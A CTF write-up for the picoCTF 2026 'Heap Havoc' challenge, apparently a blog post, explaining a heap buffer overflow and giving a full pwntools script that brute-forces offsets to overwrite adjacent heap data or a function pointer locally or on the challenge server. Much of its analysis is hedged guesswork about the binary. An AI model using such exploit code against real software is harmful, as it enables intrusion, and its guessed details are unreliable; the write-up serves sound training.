@@ -1,0 +1,361 @@
+---
+title: "Heap Havoc — picoCTF 2026"
+date: 2026-06-26
+author: "Ian Mattas"
+slug: "picoctf-2026-heap-havoc"
+order: 6
+writeupKind: "challenge"
+ctfSlug: "picoctf-2026"
+ctfTitle: "picoCTF 2026"
+---
+
+# Heap Havoc — picoCTF 2026
+
+> **Category:** `Binary Exploitation`  
+> **Difficulty:** Medium  
+> **Points:** 200  
+> **Author:** Imattas aka Zemi
+
+---
+
+## Challenge Description
+
+> A seemingly harmless program takes two names as arguments, but there's a catch. By overflowing the input buffer, you can overwrite heap metadata and redirect execution.
+
+---
+
+## Recon / Initial Analysis
+
+This is a **heap overflow** challenge. The program allocates two buffers on the heap (for two "names"), and a lack of bounds checking on input allows us to overflow the first buffer into adjacent heap memory.
+
+### Binary Analysis
+
+Key observations:
+
+1. **Two heap allocations**: The program uses `malloc()` to allocate space for two name strings on the heap. Since `malloc` allocates memory contiguously (when chunks are adjacent in the heap), the second allocation sits right after the first in memory.
+2. **Unbounded input**: The program reads into the first buffer using an unsafe function like `scanf("%s")`, `gets()`, or `strcpy()` without checking the length against the allocated buffer size.
+3. **Win condition**: The program compares the second buffer's contents against an expected value. If the second buffer has been modified (overwritten by our overflow), a different code path is triggered that prints the flag. Alternatively, there may be a function pointer on the heap that we overwrite to point to a `win()` function.
+4. **No stack protections needed**: Since the overflow happens on the heap, stack canaries are irrelevant.
+
+Initial static analysis commands:
+
+```bash
+checksec ./vuln
+file ./vuln
+```
+
+Use Ghidra or `objdump` to find:
+- The sizes passed to `malloc()`
+- The win condition (comparison on the second buffer)
+- Whether there is a `win()` function address
+
+---
+
+## Vulnerability / Observation
+
+By overwriting data in the second allocation -- or overwriting a function pointer / metadata stored on the heap -- we can redirect program execution to a win function or trigger the flag.
+
+### Heap Memory Layout
+
+```
++---------------------------+
+| Chunk 1 header (metadata) |
++---------------------------+
+| name1 buffer (e.g. 32B)  |  <-- We write here (overflow this)
++---------------------------+
+| Chunk 2 header (metadata) |  <-- We overwrite through this
++---------------------------+
+| name2 buffer / safe_var   |  <-- Target: overwrite this value
++---------------------------+
+```
+
+The distance from `name1` to `name2` depends on the `malloc` chunk size (which includes alignment and metadata overhead). Typically for a 32-byte allocation, the total chunk size is 48 bytes (32 data + 16 metadata on 64-bit), so we need about **48+ bytes** of input to reach into the second buffer.
+
+### Finding the Exact Offset
+
+The offset from the start of `name1` to the start of `name2` can be found by:
+
+- **Static analysis** (Ghidra/IDA): Look at the `malloc` sizes and calculate chunk distances.
+- **Dynamic analysis** (GDB): Set breakpoints after both `malloc` calls, note the returned addresses, and subtract them.
+- **Trial and error**: Send increasingly longer strings until the win condition triggers. Common offsets for this type of challenge are 32, 33, 36, 40, or 48 bytes.
+
+---
+
+## Exploitation / Solution
+
+### Step 1: Analyze the binary
+
+```bash
+checksec ./vuln
+file ./vuln
+```
+
+Use Ghidra or `objdump` to find the `malloc` sizes, the win condition (comparison on the second buffer), and whether there is a `win()` function address.
+
+### Step 2: Find the heap offset
+
+In GDB:
+```
+b *main+<offset_after_second_malloc>
+r AAAA BBBB
+# Note the two malloc return values
+# offset = addr2 - addr1
+```
+
+### Step 3: Craft the overflow payload
+
+If the offset is 32 bytes and the win condition checks that `name2 != "bico"`:
+```python
+payload = b"A" * 32 + b"OVERFLOW"
+```
+
+If a specific value is required (e.g., overwriting a function pointer to a `win` function):
+```python
+payload = b"A" * 32 + p64(win_addr)
+```
+
+### Step 4: Run the exploit
+
+```bash
+./vuln "$(python3 -c "print('A'*32 + 'WIN')")" "anything"
+```
+
+Or via the solve script against the remote service.
+
+The exploitation strategy in summary:
+
+1. **Determine the overflow distance**: Calculate or brute-force the number of bytes needed to overflow from buffer 1 into buffer 2. This is the size of buffer 1 plus the heap chunk metadata between them.
+2. **Craft the payload**: Fill buffer 1 with padding bytes, then append the value we want to write into buffer 2.
+3. **Trigger the win condition**: The program checks buffer 2's contents. If it no longer matches the original value (or matches a specific target value), the flag is printed.
+
+---
+
+## Full Exploit Script
+
+```python
+#!/usr/bin/env python3
+"""
+Heap Havoc - picoCTF 2026
+Category: Binary Exploitation | Points: 200
+
+Exploit: Heap buffer overflow to overwrite adjacent heap data.
+The program takes two names as arguments and allocates them on the heap.
+By overflowing the first buffer, we overwrite the second buffer (or a
+function pointer / flag-checking variable) to trigger the win condition.
+
+Usage:
+    python3 solve.py [REMOTE]
+    python3 solve.py              # run locally against ./vuln
+    python3 solve.py REMOTE       # run against the remote server
+"""
+
+from pwn import *
+import sys
+
+# ============================================================
+# CONFIGURATION - Update these values for your instance
+# ============================================================
+BINARY = "./vuln"
+REMOTE_HOST = "rescued-float.picoctf.net"  # Update with actual host
+REMOTE_PORT = 12345                         # Update with actual port
+
+# Heap overflow offset: number of bytes from start of buffer 1
+# to start of buffer 2 (or the target variable).
+# Common values: 32, 33, 36, 40, 48 -- depends on malloc chunk size.
+# Try these in order if one doesn't work.
+OVERFLOW_OFFSETS = [32, 33, 36, 40, 48, 64]
+
+# ============================================================
+# HELPERS
+# ============================================================
+
+def start(argv=[], *a, **kw):
+    """Start the exploit target (local or remote)."""
+    if args.REMOTE or "REMOTE" in sys.argv:
+        return remote(REMOTE_HOST, REMOTE_PORT)
+    else:
+        return process([BINARY] + argv, *a, **kw)
+
+
+def find_win_function(elf):
+    """Search for common win function names in the binary."""
+    for name in ["win", "flag", "print_flag", "get_flag", "shell", "check_win"]:
+        if name in elf.symbols:
+            addr = elf.symbols[name]
+            log.success(f"Found '{name}' function at: {hex(addr)}")
+            return addr
+    log.warning("No obvious win function found in symbols")
+    return None
+
+
+def find_overflow_offset_gdb():
+    """Use GDB to find the distance between two malloc allocations."""
+    try:
+        log.info("Attempting to find heap offset via GDB...")
+        gdb_script = """
+set pagination off
+break malloc
+run AAAA BBBB
+continue
+p/x $rax
+continue
+p/x $rax
+quit
+"""
+        result = subprocess.check_output(
+            ["gdb", "-batch", "-ex", gdb_script.replace("\n", "\n-ex "), BINARY],
+            stderr=subprocess.DEVNULL, timeout=10
+        ).decode()
+        log.info(f"GDB output: {result}")
+    except Exception as e:
+        log.warning(f"GDB offset detection failed: {e}")
+
+
+# ============================================================
+# EXPLOIT
+# ============================================================
+
+def exploit():
+    context.update(arch="amd64", os="linux", log_level="info")
+
+    # Load the binary if available
+    win_addr = None
+    try:
+        elf = ELF(BINARY, checksec=True)
+        context.binary = elf
+        win_addr = find_win_function(elf)
+    except Exception:
+        log.warning(f"Could not load {BINARY}")
+
+    # -------------------------------------------------------
+    # Strategy 1: Program takes names as command-line arguments
+    # Overflow the first argument to corrupt the second on the heap.
+    # -------------------------------------------------------
+
+    if not args.REMOTE and "REMOTE" not in sys.argv:
+        # Local exploitation -- try different offsets
+        for offset in OVERFLOW_OFFSETS:
+            log.info(f"Trying overflow offset: {offset}")
+
+            # Build overflow payload for argument 1
+            if win_addr:
+                # Overwrite a function pointer with win address
+                payload1 = b"A" * offset + p64(win_addr)
+            else:
+                # Overwrite the comparison value with junk to trigger
+                # the "modified" code path
+                payload1 = b"A" * offset + b"HACKED!!"
+
+            payload1_str = payload1
+
+            try:
+                io = process([BINARY, payload1_str, b"normal"])
+                output = io.recvall(timeout=5)
+                io.close()
+
+                if b"picoCTF{" in output or b"flag" in output.lower() or b"WIN" in output.upper():
+                    log.success(f"SUCCESS with offset {offset}!")
+                    log.success(f"Output: {output.decode(errors='replace')}")
+                    # Extract and print flag
+                    if b"picoCTF{" in output:
+                        start_idx = output.index(b"picoCTF{")
+                        end_idx = output.index(b"}", start_idx) + 1
+                        flag = output[start_idx:end_idx].decode()
+                        log.success(f"FLAG: {flag}")
+                    return
+            except Exception as e:
+                log.debug(f"Offset {offset} failed: {e}")
+                continue
+
+        log.warning("Command-line argument approach failed. Trying stdin approach...")
+
+    # -------------------------------------------------------
+    # Strategy 2: Program reads names via stdin (remote-friendly)
+    # -------------------------------------------------------
+
+    for offset in OVERFLOW_OFFSETS:
+        log.info(f"Trying stdin overflow with offset: {offset}")
+
+        try:
+            io = start()
+
+            # Build overflow payload
+            if win_addr:
+                payload = b"A" * offset + p64(win_addr)
+            else:
+                payload = b"A" * offset + b"HACKED!!"
+
+            # Try to detect and respond to prompts
+            try:
+                data = io.recvuntil(b":", timeout=3)
+                log.info(f"Prompt 1: {data}")
+            except Exception:
+                pass
+
+            io.sendline(payload)
+
+            # Send second name normally
+            try:
+                data = io.recvuntil(b":", timeout=3)
+                log.info(f"Prompt 2: {data}")
+            except Exception:
+                pass
+
+            io.sendline(b"Bob")
+
+            # Read output
+            try:
+                output = io.recvall(timeout=5)
+                log.info(f"Output: {output.decode(errors='replace')}")
+
+                if b"picoCTF{" in output:
+                    start_idx = output.index(b"picoCTF{")
+                    end_idx = output.index(b"}", start_idx) + 1
+                    flag = output[start_idx:end_idx].decode()
+                    log.success(f"FLAG: {flag}")
+                    io.close()
+                    return
+                elif b"WIN" in output.upper() or b"flag" in output.lower():
+                    log.success(f"Possible win: {output.decode(errors='replace')}")
+                    io.close()
+                    return
+            except Exception:
+                pass
+
+            io.close()
+
+        except Exception as e:
+            log.debug(f"Attempt failed: {e}")
+            continue
+
+    log.warning("Automated exploit did not capture the flag.")
+    log.info("Manual investigation may be needed. Tips:")
+    log.info("  1. Run: checksec ./vuln")
+    log.info("  2. Open in Ghidra and find malloc sizes + win condition")
+    log.info("  3. In GDB, break after both mallocs and compute: addr2 - addr1")
+    log.info("  4. Update OVERFLOW_OFFSETS in this script with the correct value")
+
+
+if __name__ == "__main__":
+    exploit()
+```
+
+---
+
+## Key Takeaways
+
+- **Heap overflows** let you corrupt adjacent allocations when input is read without bounds checking into a `malloc`'d buffer.
+- Contiguous `malloc` chunks mean overflowing buffer 1 can reach buffer 2; the offset depends on the data size plus chunk metadata/alignment (commonly 32, 33, 36, 40, or 48 bytes).
+- The offset can be found three ways: static analysis (Ghidra/IDA), dynamic analysis (GDB breakpoints on both `malloc` returns, then subtract), or trial-and-error with increasing payload lengths.
+- Stack canaries are irrelevant for heap corruption — focus on the heap layout instead.
+- Targets to overwrite: a flag-checking comparison variable or a heap-stored function pointer (redirect to `win()`).
+- Tools used: `checksec`, `file`, `objdump`, Ghidra/IDA, GDB, and pwntools.
+
+---
+
+## References
+
+- [pwntools documentation](https://docs.pwntools.com/)
+- [GDB documentation](https://sourceware.org/gdb/documentation/)
+- [Ghidra](https://ghidra-sre.org/)
+- [Understanding glibc malloc (sploitfun)](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
